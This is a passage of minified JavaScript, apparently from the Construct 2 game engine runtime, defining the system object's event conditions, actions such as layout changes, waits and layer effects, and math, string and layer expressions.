                        for (l = 0, u = p.siblings.length; l < u; l++)(f = (d = p.siblings[l]).type.getCurrentSol()).select_all = !1, cr.clearArray(f.instances), f.instances[0] = d;
                    v.index = h, g.retrigger(), this.runtime.popSol(g.solModifiers)
                } else
                    for (o.select_all = !1, cr.clearArray(o.instances), h = 0, c = a.length; h < c && !v.stopped; h++) {
                        if (p = a[h], o.instances[0] = p, b)
                            for (l = 0, u = p.siblings.length; l < u; l++)(f = (d = p.siblings[l]).type.getCurrentSol()).select_all = !1, cr.clearArray(f.instances), f.instances[0] = d;
                        v.index = h, g.retrigger()
                    }
            return cr.clearArray(a), this.runtime.popLoopStack(), n--, !1
        }, e.prototype.PickByComparison = function (t, e, r, s) {
            var o, a, h, c;
            if (t) {
                n++, i.length === n && i.push([]);
                var l = i[n],
                    u = t.getCurrentSol();
                cr.shallowAssignArray(l, u.getObjects()), u.select_all && cr.clearArray(u.else_instances);
                var p = this.runtime.getCurrentCondition();
                for (o = 0, h = 0, a = l.length; o < a; o++) c = l[o], l[h] = c, e = p.parameters[1].get(o), s = p.parameters[3].get(o), cr.do_cmp(e, r, s) ? h++ : u.else_instances.push(c);
                return cr.truncateArray(l, h), u.select_all = !1, cr.shallowAssignArray(u.instances, l), cr.clearArray(l), n--, t.applySolToContainer(), !!u.instances.length
            }
        }, e.prototype.PickByEvaluate = function (t, e) {
            var r, s, o, a;
            if (t) {
                n++, i.length === n && i.push([]);
                var h = i[n],
                    c = t.getCurrentSol();
                cr.shallowAssignArray(h, c.getObjects()), c.select_all && cr.clearArray(c.else_instances);
                var l = this.runtime.getCurrentCondition();
                for (r = 0, o = 0, s = h.length; r < s; r++) a = h[r], h[o] = a, l.parameters[1].get(r) ? o++ : c.else_instances.push(a);
                return cr.truncateArray(h, o), c.select_all = !1, cr.shallowAssignArray(c.instances, h), cr.clearArray(h), n--, t.applySolToContainer(), !!c.instances.length
            }
        }, e.prototype.TriggerOnce = function () {
            var t = this.runtime.getCurrentCondition().extra;
            void 0 === t.TriggerOnce_lastTick && (t.TriggerOnce_lastTick = -1);
            var e = t.TriggerOnce_lastTick,
                i = this.runtime.tickcount;
            return t.TriggerOnce_lastTick = i, this.runtime.layout_first_tick || e !== i - 1
        }, e.prototype.Every = function (t) {
            var e = this.runtime.getCurrentCondition(),
                i = e.extra.Every_lastTime || 0,
                n = this.runtime.kahanTime.sum;
            void 0 === e.extra.Every_seconds && (e.extra.Every_seconds = t);
            var r = e.extra.Every_seconds;
            return n >= i + r ? (e.extra.Every_lastTime = i + r, n >= e.extra.Every_lastTime + .04 && (e.extra.Every_lastTime = n), e.extra.Every_seconds = t, !0) : (n < i - .1 && (e.extra.Every_lastTime = n), !1)
        }, e.prototype.PickNth = function (t, e) {
            if (!t) return !1;
            var i = t.getCurrentSol(),
                n = i.getObjects();
            if ((e = cr.floor(e)) < 0 || e >= n.length) return !1;
            var r = n[e];
            return i.pick_one(r), t.applySolToContainer(), !0
        }, e.prototype.PickRandom = function (t) {
            if (!t) return !1;
            var e = t.getCurrentSol(),
                i = e.getObjects(),
                n = cr.floor(Math.random() * i.length);
            if (n >= i.length) return !1;
            var r = i[n];
            return e.pick_one(r), t.applySolToContainer(), !0
        }, e.prototype.CompareVar = function (t, e, i) {
            return cr.do_cmp(t.getValue(), e, i)
        }, e.prototype.IsGroupActive = function (t) {
            var e = this.runtime.groups_by_name[t.toLowerCase()];
            return e && e.group_active
        }, e.prototype.IsPreview = function () {
            return "undefined" != typeof cr_is_preview
        }, e.prototype.PickAll = function (t) {
            return !!t && (!!t.instances.length && (t.getCurrentSol().select_all = !0, t.applySolToContainer(), !0))
        }, e.prototype.IsMobile = function () {
            return this.runtime.isMobile
        }, e.prototype.CompareBetween = function (t, e, i) {
            return t >= e && t <= i
        }, e.prototype.Else = function () {
            var t = this.runtime.getCurrentEventStack();
            return !t.else_branch_ran && !t.last_event_true
        }, e.prototype.OnLoadFinished = function () {
            return !0
        }, e.prototype.OnCanvasSnapshot = function () {
            return !0
        }, e.prototype.EffectsSupported = function () {
            return !!this.runtime.glwrap
        }, e.prototype.OnSaveComplete = function () {
            return !0
        }, e.prototype.OnSaveFailed = function () {
            return !0
        }, e.prototype.OnLoadComplete = function () {
            return !0
        }, e.prototype.OnLoadFailed = function () {
            return !0
        }, e.prototype.ObjectUIDExists = function (t) {
            return !!this.runtime.getObjectByUID(t)
        }, e.prototype.IsOnPlatform = function (t) {
            var e = this.runtime;
            switch (t) {
                case 0:
                    return !(e.isDomFree || e.isNodeWebkit || e.isCordova || e.isWinJS || e.isWindowsPhone8 || e.isBlackberry10 || e.isAmazonWebApp);
                case 1:
                    return e.isiOS;
                case 2:
                    return e.isAndroid;
                case 3:
                    return e.isWindows8App;
                case 4:
                    return e.isWindowsPhone8;
                case 5:
                    return e.isBlackberry10;
                case 6:
                    return e.isTizen;
                case 7:
                    return e.isCocoonJs;
                case 8:
                    return e.isCordova;
                case 9:
                    return e.isArcade;
                case 10:
                    return e.isNodeWebkit;
                case 11:
                    return e.isCrosswalk;
                case 12:
                    return e.isAmazonWebApp;
                case 13:
                    return e.isWindows10;
                default:
                    return !1
            }
        };
        var s = null,
            o = "",
            a = "";

        function h(t, e) {
            return s && t === o && e === a || (s = new RegExp(t, e), o = t, a = e), s.lastIndex = 0, s
        }
        e.prototype.RegexTest = function (t, e, i) {
            return h(e, i).test(t)
        };
        var c = [];

        function l() {}
        e.prototype.PickOverlappingPoint = function (t, e, i) {
            if (!t) return !1;
            var n, r, s, o = t.getCurrentSol(),
                a = o.getObjects(),
                h = this.runtime.getCurrentEventStack().current_event.orblock,
                l = this.runtime.getCurrentCondition();
            for (o.select_all ? (cr.shallowAssignArray(c, a), cr.clearArray(o.else_instances), o.select_all = !1, cr.clearArray(o.instances)) : h ? (cr.shallowAssignArray(c, o.else_instances), cr.clearArray(o.else_instances)) : (cr.shallowAssignArray(c, a), cr.clearArray(o.instances)), n = 0, r = c.length; n < r; ++n)(s = c[n]).update_bbox(), cr.xor(s.contains_pt(e, i), l.inverted) ? o.instances.push(s) : o.else_instances.push(s);
            return t.applySolToContainer(), cr.xor(!!o.instances.length, l.inverted)
        }, e.prototype.IsNaN = function (t) {
            return !!isNaN(t)
        }, e.prototype.AngleWithin = function (t, e, i) {
            return cr.angleDiff(cr.to_radians(t), cr.to_radians(i)) <= cr.to_radians(e)
        }, e.prototype.IsClockwiseFrom = function (t, e) {
            return cr.angleClockwise(cr.to_radians(t), cr.to_radians(e))
        }, e.prototype.IsBetweenAngles = function (t, e, i) {
            var n = cr.to_clamped_radians(t),
                r = cr.to_clamped_radians(e),
                s = cr.to_clamped_radians(i);
            return !cr.angleClockwise(s, r) ? !(!cr.angleClockwise(n, r) && cr.angleClockwise(n, s)) : cr.angleClockwise(n, r) && !cr.angleClockwise(n, s)
        }, e.prototype.IsValueType = function (t, e) {
            return "number" == typeof t ? 0 === e : 1 === e
        }, t.cnds = new e, l.prototype.GoToLayout = function (t) {
            this.runtime.isloading || this.runtime.changelayout || (this.runtime.changelayout = t)
        }, l.prototype.NextPrevLayout = function (t) {
            if (!this.runtime.isloading && !this.runtime.changelayout) {
                var e = this.runtime.layouts_by_index.indexOf(this.runtime.running_layout);
                if ((!t || 0 !== e) && (t || e !== this.runtime.layouts_by_index.length - 1)) {
                    var i = this.runtime.layouts_by_index[e + (t ? -1 : 1)];
                    this.runtime.changelayout = i
                }
            }
        }, l.prototype.CreateObject = function (t, e, i, n) {
            if (e && t) {
                var r = this.runtime.createInstance(t, e, i, n);
                if (r) {
                    var s, o, a;
                    if (this.runtime.isInOnDestroy++, this.runtime.trigger(Object.getPrototypeOf(t.plugin).cnds.OnCreated, r), r.is_contained)
                        for (s = 0, o = r.siblings.length; s < o; s++) a = r.siblings[s], this.runtime.trigger(Object.getPrototypeOf(a.type.plugin).cnds.OnCreated, a);
                    this.runtime.isInOnDestroy--;
                    var h = t.getCurrentSol();
                    if (h.select_all = !1, cr.clearArray(h.instances), h.instances[0] = r, r.is_contained)
                        for (s = 0, o = r.siblings.length; s < o; s++)(h = (a = r.siblings[s]).type.getCurrentSol()).select_all = !1, cr.clearArray(h.instances), h.instances[0] = a
                }
            }
        }, l.prototype.SetLayerVisible = function (t, e) {
            t && t.visible !== e && (t.visible = e, this.runtime.redraw = !0)
        }, l.prototype.SetLayerOpacity = function (t, e) {
            t && (e = cr.clamp(e / 100, 0, 1), t.opacity !== e && (t.opacity = e, this.runtime.redraw = !0))
        }, l.prototype.SetLayerScaleRate = function (t, e) {
            t && t.zoomRate !== e && (t.zoomRate = e, this.runtime.redraw = !0)
        }, l.prototype.SetLayerForceOwnTexture = function (t, e) {
            t && (e = !!e, t.forceOwnTexture !== e && (t.forceOwnTexture = e, this.runtime.redraw = !0))
        }, l.prototype.SetLayoutScale = function (t) {
            this.runtime.running_layout && this.runtime.running_layout.scale !== t && (this.runtime.running_layout.scale = t, this.runtime.running_layout.boundScrolling(), this.runtime.redraw = !0)
        }, l.prototype.ScrollX = function (t) {
            this.runtime.running_layout.scrollToX(t)
        }, l.prototype.ScrollY = function (t) {
            this.runtime.running_layout.scrollToY(t)
        }, l.prototype.Scroll = function (t, e) {
            this.runtime.running_layout.scrollToX(t), this.runtime.running_layout.scrollToY(e)
        }, l.prototype.ScrollToObject = function (t) {
            var e = t.getFirstPicked();
            e && (this.runtime.running_layout.scrollToX(e.x), this.runtime.running_layout.scrollToY(e.y))
        }, l.prototype.SetVar = function (t, e) {
            0 === t.vartype ? cr.is_number(e) ? t.setValue(e) : t.setValue(parseFloat(e)) : 1 === t.vartype && t.setValue(e.toString())
        }, l.prototype.AddVar = function (t, e) {
            0 === t.vartype ? cr.is_number(e) ? t.setValue(t.getValue() + e) : t.setValue(t.getValue() + parseFloat(e)) : 1 === t.vartype && t.setValue(t.getValue() + e.toString())
        }, l.prototype.SubVar = function (t, e) {
            0 === t.vartype && (cr.is_number(e) ? t.setValue(t.getValue() - e) : t.setValue(t.getValue() - parseFloat(e)))
        }, l.prototype.SetGroupActive = function (t, e) {
            var i = this.runtime.groups_by_name[t.toLowerCase()];
            if (i) switch (e) {
                case 0:
                    i.setGroupActive(!1);
                    break;
                case 1:
                    i.setGroupActive(!0);
                    break;
                case 2:
                    i.setGroupActive(!i.group_active);
                    break
            }
        }, l.prototype.SetTimescale = function (t) {
            var e = t;
            e < 0 && (e = 0), this.runtime.timescale = e
        }, l.prototype.SetObjectTimescale = function (t, e) {
            var i = e;
            if (i < 0 && (i = 0), t) {
                var n, r, s = t.getCurrentSol().getObjects();
                for (n = 0, r = s.length; n < r; n++) s[n].my_timescale = i
            }
        }, l.prototype.RestoreObjectTimescale = function (t) {
            if (!t) return !1;
            var e, i, n = t.getCurrentSol().getObjects();
            for (e = 0, i = n.length; e < i; e++) n[e].my_timescale = -1
        };
        var u = [];

        function p() {
            var t;
            return u.length ? t = u.pop() : ((t = {}).sols = {}, t.solModifiers = []), t.deleteme = !1, t
        }

        function d(t) {
            cr.wipe(t.sols), cr.clearArray(t.solModifiers), u.push(t)
        }
        var f = [];

        function m() {
            var t;
            return f.length ? t = f.pop() : (t = {}).insts = [], t.sa = !1, t
        }

        function g(t) {
            cr.clearArray(t.insts), f.push(t)
        }

        function y(t, e) {
            var i = t[0] - e[0];
            return 0 !== i ? i : t[1] - e[1]
        }

        function _(t, e) {
            return t[1] - e[1]
        }

        function v() {}
        l.prototype.Wait = function (t) {
            if (!(t < 0)) {
                var e, i, n, r, s, o = this.runtime.getCurrentEventStack(),
                    a = p();
                for (a.time = this.runtime.kahanTime.sum + t, a.signaltag = "", a.signalled = !1, a.ev = o.current_event, a.actindex = o.actindex + 1, e = 0, i = this.runtime.types_by_index.length; e < i; e++)(n = (r = this.runtime.types_by_index[e]).getCurrentSol()).select_all && -1 === o.current_event.solModifiers.indexOf(r) || (a.solModifiers.push(r), (s = m()).sa = n.select_all, cr.shallowAssignArray(s.insts, n.instances), a.sols[e.toString()] = s);
                return this.waits.push(a), !0
            }
        }, l.prototype.WaitForSignal = function (t) {
            var e, i, n, r, s, o = this.runtime.getCurrentEventStack(),
                a = p();
            for (a.time = -1, a.signaltag = t.toLowerCase(), a.signalled = !1, a.ev = o.current_event, a.actindex = o.actindex + 1, e = 0, i = this.runtime.types_by_index.length; e < i; e++)(n = (r = this.runtime.types_by_index[e]).getCurrentSol()).select_all && -1 === o.current_event.solModifiers.indexOf(r) || (a.solModifiers.push(r), (s = m()).sa = n.select_all, cr.shallowAssignArray(s.insts, n.instances), a.sols[e.toString()] = s);
            return this.waits.push(a), !0
        }, l.prototype.Signal = function (t) {
            var e, i, n, r = t.toLowerCase();
            for (e = 0, i = this.waits.length; e < i; ++e) - 1 === (n = this.waits[e]).time && n.signaltag === r && (n.signalled = !0)
        }, l.prototype.SetLayerScale = function (t, e) {
            t && t.scale !== e && (t.scale = e, this.runtime.redraw = !0)
        }, l.prototype.ResetGlobals = function () {
            var t, e, i;
            for (t = 0, e = this.runtime.all_global_vars.length; t < e; t++)(i = this.runtime.all_global_vars[t]).data = i.initial
        }, l.prototype.SetLayoutAngle = function (t) {
            t = cr.to_radians(t), t = cr.clamp_angle(t), this.runtime.running_layout && this.runtime.running_layout.angle !== t && (this.runtime.running_layout.angle = t, this.runtime.redraw = !0)
        }, l.prototype.SetLayerAngle = function (t, e) {
            t && (e = cr.to_radians(e), e = cr.clamp_angle(e), t.angle !== e && (t.angle = e, this.runtime.redraw = !0))
        }, l.prototype.SetLayerParallax = function (t, e, i) {
            if (t && (t.parallaxX !== e / 100 || t.parallaxY !== i / 100)) {
                if (t.parallaxX = e / 100, t.parallaxY = i / 100, 1 !== t.parallaxX || 1 !== t.parallaxY) {
                    var n, r, s = t.instances;
                    for (n = 0, r = s.length; n < r; ++n) s[n].type.any_instance_parallaxed = !0
                }
                this.runtime.redraw = !0
            }
        }, l.prototype.SetLayerBackground = function (t, e) {
            if (t) {
                var i = cr.GetRValue(e),
                    n = cr.GetGValue(e),
                    r = cr.GetBValue(e);
                t.background_color[0] === i && t.background_color[1] === n && t.background_color[2] === r || (t.background_color[0] = i, t.background_color[1] = n, t.background_color[2] = r, this.runtime.redraw = !0)
            }
        }, l.prototype.SetLayerTransparent = function (t, e) {
            t && !!e != !!t.transparent && (t.transparent = !!e, this.runtime.redraw = !0)
        }, l.prototype.SetLayerBlendMode = function (t, e) {
            t && t.blend_mode !== e && (t.blend_mode = e, t.compositeOp = cr.effectToCompositeOp(t.blend_mode), this.runtime.gl && cr.setGLBlend(t, t.blend_mode, this.runtime.gl), this.runtime.redraw = !0)
        }, l.prototype.StopLoop = function () {
            this.runtime.loop_stack_index < 0 || (this.runtime.getCurrentLoop().stopped = !0)
        }, l.prototype.GoToLayoutByName = function (t) {
            var e;
            if (!this.runtime.isloading && !this.runtime.changelayout)
                for (e in this.runtime.layouts)
                    if (this.runtime.layouts.hasOwnProperty(e) && cr.equals_nocase(e, t)) return void(this.runtime.changelayout = this.runtime.layouts[e])
        }, l.prototype.RestartLayout = function (t) {
            var e, i, n;
            if (!this.runtime.isloading && (!this.runtime.changelayout && this.runtime.running_layout))
                for (this.runtime.changelayout = this.runtime.running_layout, e = 0, i = this.runtime.allGroups.length; e < i; e++)(n = this.runtime.allGroups[e]).setGroupActive(n.initially_activated)
        }, l.prototype.SnapshotCanvas = function (t, e) {
            this.runtime.doCanvasSnapshot(0 === t ? "image/png" : "image/jpeg", e / 100)
        }, l.prototype.SetCanvasSize = function (t, e) {
            if (!(t <= 0 || e <= 0)) {
                var i = this.runtime.fullscreen_mode;
                (document.mozFullScreen || document.webkitIsFullScreen || !!document.msFullscreenElement || document.fullScreen || this.runtime.isNodeFullscreen) && this.runtime.fullscreen_scaling > 0 && (i = this.runtime.fullscreen_scaling), 0 === i ? this.runtime.setSize(t, e, !0) : (this.runtime.original_width = t, this.runtime.original_height = e, this.runtime.setSize(this.runtime.lastWindowWidth, this.runtime.lastWindowHeight, !0))
            }
        }, l.prototype.SetLayoutEffectEnabled = function (t, e) {
            if (this.runtime.running_layout && this.runtime.glwrap) {
                var i = this.runtime.running_layout.getEffectByName(e);
                if (i) {
                    var n = 1 === t;
                    i.active != n && (i.active = n, this.runtime.running_layout.updateActiveEffects(), this.runtime.redraw = !0)
                }
            }
        }, l.prototype.SetLayerEffectEnabled = function (t, e, i) {
            if (t && this.runtime.glwrap) {
                var n = t.getEffectByName(i);
                if (n) {
                    var r = 1 === e;
                    n.active != r && (n.active = r, t.updateActiveEffects(), this.runtime.redraw = !0)
                }
            }
        }, l.prototype.SetLayoutEffectParam = function (t, e, i) {
            if (this.runtime.running_layout && this.runtime.glwrap) {
                var n = this.runtime.running_layout.getEffectByName(t);
                if (n) {
                    var r = this.runtime.running_layout.effect_params[n.index];
                    (e = Math.floor(e)) < 0 || e >= r.length || (1 === this.runtime.glwrap.getProgramParameterType(n.shaderindex, e) && (i /= 100), r[e] !== i && (r[e] = i, n.active && (this.runtime.redraw = !0)))
                }
            }
        }, l.prototype.SetLayerEffectParam = function (t, e, i, n) {
            if (t && this.runtime.glwrap) {
                var r = t.getEffectByName(e);
                if (r) {
                    var s = t.effect_params[r.index];
                    (i = Math.floor(i)) < 0 || i >= s.length || (1 === this.runtime.glwrap.getProgramParameterType(r.shaderindex, i) && (n /= 100), s[i] !== n && (s[i] = n, r.active && (this.runtime.redraw = !0)))
                }
            }
        }, l.prototype.SaveState = function (t) {
            this.runtime.saveToSlot = t
        }, l.prototype.LoadState = function (t) {
            this.runtime.loadFromSlot = t
        }, l.prototype.LoadStateJSON = function (t) {
            this.runtime.loadFromJson = t
        }, l.prototype.SetHalfFramerateMode = function (t) {
            this.runtime.halfFramerateMode = 0 !== t
        }, l.prototype.SetFullscreenQuality = function (t) {
            (document.mozFullScreen || document.webkitIsFullScreen || !!document.msFullscreenElement || document.fullScreen || this.isNodeFullscreen || 0 !== this.runtime.fullscreen_mode) && (this.runtime.wantFullscreenScalingQuality = 0 !== t, this.runtime.setSize(this.runtime.lastWindowWidth, this.runtime.lastWindowHeight, !0))
        }, l.prototype.ResetPersisted = function () {
            var t, e;
            for (t = 0, e = this.runtime.layouts_by_index.length; t < e; ++t) this.runtime.layouts_by_index[t].persist_data = {}, this.runtime.layouts_by_index[t].first_visit = !0
        }, l.prototype.RecreateInitialObjects = function (t, e, i, n, r) {
            t && this.runtime.running_layout.recreateInitialObjects(t, e, i, n, r)
        }, l.prototype.SetPixelRounding = function (t) {
            this.runtime.pixel_rounding = 0 !== t, this.runtime.redraw = !0
        }, l.prototype.SetMinimumFramerate = function (t) {
            t < 1 && (t = 1), t > 120 && (t = 120), this.runtime.minimumFramerate = t
        }, l.prototype.SortZOrderByInstVar = function (t, e) {
            if (t) {
                var i, n, r, s, o, a, h = t.getCurrentSol().getObjects(),
                    c = [],
                    l = [],
                    u = this.runtime.running_layout,
                    p = t.is_family,
                    d = t.family_index;
                for (i = 0, n = h.length; i < n; ++i)(r = h[i]).layer && (s = p ? r.instance_vars[e + r.type.family_var_map[d]] : r.instance_vars[e], c.push([r.layer.index, r.get_zindex()]), l.push([r, s]));
                if (c.length)
                    for (c.sort(y), l.sort(_), i = 0, n = c.length; i < n; ++i) r = l[i][0], o = u.layers[c[i][0]], a = c[i][1], o.instances[a] !== r && (o.instances[a] = r, r.layer = o, o.setZIndicesStaleFrom(a))
            }
        }, t.acts = new l, v.prototype.int = function (t, e) {
            cr.is_string(e) ? (t.set_int(parseInt(e, 10)), isNaN(t.data) && (t.data = 0)) : t.set_int(e)
        }, v.prototype.float = function (t, e) {
            cr.is_string(e) ? (t.set_float(parseFloat(e)), isNaN(t.data) && (t.data = 0)) : t.set_float(e)
        }, v.prototype.str = function (t, e) {
            cr.is_string(e) ? t.set_string(e) : t.set_string(e.toString())
        }, v.prototype.len = function (t, e) {
            t.set_int(e.length || 0)
        }, v.prototype.random = function (t, e, i) {
            void 0 === i ? t.set_float(Math.random() * e) : t.set_float(Math.random() * (i - e) + e)
        }, v.prototype.sqrt = function (t, e) {
            t.set_float(Math.sqrt(e))
        }, v.prototype.abs = function (t, e) {
            t.set_float(Math.abs(e))
        }, v.prototype.round = function (t, e) {
            t.set_int(Math.round(e))
        }, v.prototype.floor = function (t, e) {
            t.set_int(Math.floor(e))
        }, v.prototype.ceil = function (t, e) {
            t.set_int(Math.ceil(e))
        }, v.prototype.sin = function (t, e) {
            t.set_float(Math.sin(cr.to_radians(e)))
        }, v.prototype.cos = function (t, e) {
            t.set_float(Math.cos(cr.to_radians(e)))
        }, v.prototype.tan = function (t, e) {
            t.set_float(Math.tan(cr.to_radians(e)))
        }, v.prototype.asin = function (t, e) {
            t.set_float(cr.to_degrees(Math.asin(e)))
        }, v.prototype.acos = function (t, e) {
            t.set_float(cr.to_degrees(Math.acos(e)))
        }, v.prototype.atan = function (t, e) {
            t.set_float(cr.to_degrees(Math.atan(e)))
        }, v.prototype.exp = function (t, e) {
            t.set_float(Math.exp(e))
        }, v.prototype.ln = function (t, e) {
            t.set_float(Math.log(e))
        }, v.prototype.log10 = function (t, e) {
            t.set_float(Math.log(e) / Math.LN10)
        }, v.prototype.max = function (t) {
            var e, i, n, r = arguments[1];
            for ("number" != typeof r && (r = 0), e = 2, i = arguments.length; e < i; e++) "number" == typeof (n = arguments[e]) && r < n && (r = n);
            t.set_float(r)
        }, v.prototype.min = function (t) {
            var e, i, n, r = arguments[1];
            for ("number" != typeof r && (r = 0), e = 2, i = arguments.length; e < i; e++) "number" == typeof (n = arguments[e]) && r > n && (r = n);
            t.set_float(r)
        }, v.prototype.dt = function (t) {
            t.set_float(this.runtime.dt)
        }, v.prototype.timescale = function (t) {
            t.set_float(this.runtime.timescale)
        }, v.prototype.wallclocktime = function (t) {
            t.set_float((Date.now() - this.runtime.start_time) / 1e3)
        }, v.prototype.time = function (t) {
            t.set_float(this.runtime.kahanTime.sum)
        }, v.prototype.tickcount = function (t) {
            t.set_int(this.runtime.tickcount)
        }, v.prototype.objectcount = function (t) {
            t.set_int(this.runtime.objectcount)
        }, v.prototype.fps = function (t) {
            t.set_int(this.runtime.fps)
        }, v.prototype.loopindex = function (t, e) {
            var i, n;
            if (this.runtime.loop_stack.length)
                if (e) {
                    for (n = this.runtime.loop_stack_index; n >= 0; --n)
                        if ((i = this.runtime.loop_stack[n]).name === e) return void t.set_int(i.index);
                    t.set_int(0)
                } else i = this.runtime.getCurrentLoop(), t.set_int(i ? i.index : -1);
            else t.set_int(0)
        }, v.prototype.distance = function (t, e, i, n, r) {
            t.set_float(cr.distanceTo(e, i, n, r))
        }, v.prototype.angle = function (t, e, i, n, r) {
            t.set_float(cr.to_degrees(cr.angleTo(e, i, n, r)))
        }, v.prototype.scrollx = function (t) {
            t.set_float(this.runtime.running_layout.scrollX)
        }, v.prototype.scrolly = function (t) {
            t.set_float(this.runtime.running_layout.scrollY)
        }, v.prototype.newline = function (t) {
            t.set_string("\n")
        }, v.prototype.lerp = function (t, e, i, n) {
            t.set_float(cr.lerp(e, i, n))
        }, v.prototype.qarp = function (t, e, i, n, r) {
            t.set_float(cr.qarp(e, i, n, r))
        }, v.prototype.cubic = function (t, e, i, n, r, s) {
            t.set_float(cr.cubic(e, i, n, r, s))
        }, v.prototype.cosp = function (t, e, i, n) {
            t.set_float(cr.cosp(e, i, n))
        }, v.prototype.windowwidth = function (t) {
            t.set_int(this.runtime.width)
        }, v.prototype.windowheight = function (t) {
            t.set_int(this.runtime.height)
        }, v.prototype.uppercase = function (t, e) {
            t.set_string(cr.is_string(e) ? e.toUpperCase() : "")
        }, v.prototype.lowercase = function (t, e) {
            t.set_string(cr.is_string(e) ? e.toLowerCase() : "")
        }, v.prototype.clamp = function (t, e, i, n) {
            e < i ? t.set_float(i) : e > n ? t.set_float(n) : t.set_float(e)
        }, v.prototype.layerscale = function (t, e) {
            var i = this.runtime.getLayer(e);
            i ? t.set_float(i.scale) : t.set_float(0)
        }, v.prototype.layeropacity = function (t, e) {
            var i = this.runtime.getLayer(e);
            i ? t.set_float(100 * i.opacity) : t.set_float(0)
        }, v.prototype.layerscalerate = function (t, e) {
            var i = this.runtime.getLayer(e);
            i ? t.set_float(i.zoomRate) : t.set_float(0)
        }, v.prototype.layerparallaxx = function (t, e) {
            var i = this.runtime.getLayer(e);
            i ? t.set_float(100 * i.parallaxX) : t.set_float(0)
        }, v.prototype.layerparallaxy = function (t, e) {
            var i = this.runtime.getLayer(e);
            i ? t.set_float(100 * i.parallaxY) : t.set_float(0)
        }, v.prototype.layerindex = function (t, e) {
            var i = this.runtime.getLayer(e);
            i ? t.set_int(i.index) : t.set_int(-1)
        }, v.prototype.layoutscale = function (t) {
            this.runtime.running_layout ? t.set_float(this.runtime.running_layout.scale) : t.set_float(0)
        }, v.prototype.layoutangle = function (t) {
            t.set_float(cr.to_degrees(this.runtime.running_layout.angle))
        }, v.prototype.layerangle = function (t, e) {
            var i = this.runtime.getLayer(e);
            i ? t.set_float(cr.to_degrees(i.angle)) : t.set_float(0)
        }, v.prototype.layoutwidth = function (t) {
            t.set_int(this.runtime.running_layout.width)
        }, v.prototype.layoutheight = function (t) {
            t.set_int(this.runtime.running_layout.height)
        }, v.prototype.find = function (t, e, i) {
            cr.is_string(e) && cr.is_string(i) ? t.set_int(e.search(new RegExp(cr.regexp_escape(i), "i"))) : t.set_int(-1)
        }, v.prototype.findcase = function (t, e, i) {
            cr.is_string(e) && cr.is_string(i) ? t.set_int(e.search(new RegExp(cr.regexp_escape(i), ""))) : t.set_int(-1)
        }, v.prototype.left = function (t, e, i) {
            t.set_string(cr.is_string(e) ? e.substr(0, i) : "")
        }, v.prototype.right = function (t, e, i) {
            t.set_string(cr.is_string(e) ? e.substr(e.length - i) : "")
        }, v.prototype.mid = function (t, e, i, n) {
            t.set_string(cr.is_string(e) ? e.substr(i, n) : "")
        }, v.prototype.tokenat = function (t, e, i, n) {
            if (cr.is_string(e) && cr.is_string(n)) {
                var r = e.split(n),
                    s = cr.floor(i);
                s < 0 || s >= r.length ? t.set_string("") : t.set_string(r[s])
            } else t.set_string("")
        }, v.prototype.tokencount = function (t, e, i) {
            cr.is_string(e) && e.length ? t.set_int(e.split(i).length) : t.set_int(0)
        }, v.prototype.replace = function (t, e, i, n) {
            cr.is_string(e) && cr.is_string(i) && cr.is_string(n) ? t.set_string(e.replace(new RegExp(cr.regexp_escape(i), "gi"), n)) : t.set_string(cr.is_string(e) ? e : "")
        }, v.prototype.trim = function (t, e) {
            t.set_string(cr.is_string(e) ? e.trim() : "")
        }, v.prototype.pi = function (t) {
            t.set_float(cr.PI)
        }, v.prototype.layoutname = function (t) {
            this.runtime.running_layout ? t.set_string(this.runtime.running_layout.name) : t.set_string("")
        }, v.prototype.renderer = function (t) {
            t.set_string(this.runtime.gl ? "webgl" : "canvas2d")
        }, v.prototype.rendererdetail = function (t) {
            t.set_string(this.runtime.glUnmaskedRenderer)
        }, v.prototype.anglediff = function (t, e, i) {
            t.set_float(cr.to_degrees(cr.angleDiff(cr.to_radians(e), cr.to_radians(i))))
        }, v.prototype.choose = function (t) {
            var e = cr.floor(Math.random() * (arguments.length - 1));
            t.set_any(arguments[e + 1])
        }, v.prototype.rgb = function (t, e, i, n) {
            t.set_int(cr.RGB(e, i, n))
        }, v.prototype.projectversion = function (t) {
            t.set_string(this.runtime.versionstr)
        }, v.prototype.projectname = function (t) {
            t.set_string(this.runtime.projectName)
        }, v.prototype.anglelerp = function (t, e, i, n) {
            e = cr.to_radians(e), i = cr.to_radians(i);
            var r = cr.angleDiff(e, i);
            cr.angleClockwise(i, e) ? t.set_float(cr.to_clamped_degrees(e + r * n)) : t.set_float(cr.to_clamped_degrees(e - r * n))
        }, v.prototype.anglerotate = function (t, e, i, n) {
            e = cr.to_radians(e), i = cr.to_radians(i), n = cr.to_radians(n), t.set_float(cr.to_clamped_degrees(cr.angleRotate(e, i, n)))
        }, v.prototype.zeropad = function (t, e, i) {
            var n = e < 0 ? "-" : "";
            e < 0 && (e = -e);
            for (var r = i - e.toString().length, s = 0; s < r; s++) n += "0";
            t.set_string(n + e.toString())
        }, v.prototype.cpuutilisation = function (t) {
            t.set_float(this.runtime.cpuutilisation / 1e3)
        }, v.prototype.viewportleft = function (t, e) {
            var i = this.runtime.getLayer(e);
            t.set_float(i ? i.viewLeft : 0)
        }, v.prototype.viewporttop = function (t, e) {
            var i = this.runtime.getLayer(e);
            t.set_float(i ? i.viewTop : 0)
        }, v.prototype.viewportright = function (t, e) {
            var i = this.runtime.getLayer(e);
            t.set_float(i ? i.viewRight : 0)
        }, v.prototype.viewportbottom = function (t, e) {
            var i = this.runtime.getLayer(e);
            t.set_float(i ? i.viewBottom : 0)
        }, v.prototype.loadingprogress = function (t) {
            t.set_float(this.runtime.loadingprogress)
        }, v.prototype.unlerp = function (t, e, i, n) {
            t.set_float(cr.unlerp(e, i, n))
        }, v.prototype.canvassnapshot = function (t) {
            t.set_string(this.runtime.snapshotData)
        }, v.prototype.urlencode = function (t, e) {
            t.set_string(encodeURIComponent(e))
        }, v.prototype.urldecode = function (t, e) {
            t.set_string(decodeURIComponent(e))
        }, v.prototype.canvastolayerx = function (t, e, i, n) {
            var r = this.runtime.getLayer(e);
            t.set_float(r ? r.canvasToLayer(i, n, !0) : 0)
        }, v.prototype.canvastolayery = function (t, e, i, n) {
            var r = this.runtime.getLayer(e);
            t.set_float(r ? r.canvasToLayer(i, n, !1) : 0)
        }, v.prototype.layertocanvasx = function (t, e, i, n) {
            var r = this.runtime.getLayer(e);
            t.set_float(r ? r.layerToCanvas(i, n, !0) : 0)
        }, v.prototype.layertocanvasy = function (t, e, i, n) {
            var r = this.runtime.getLayer(e);
            t.set_float(r ? r.layerToCanvas(i, n, !1) : 0)
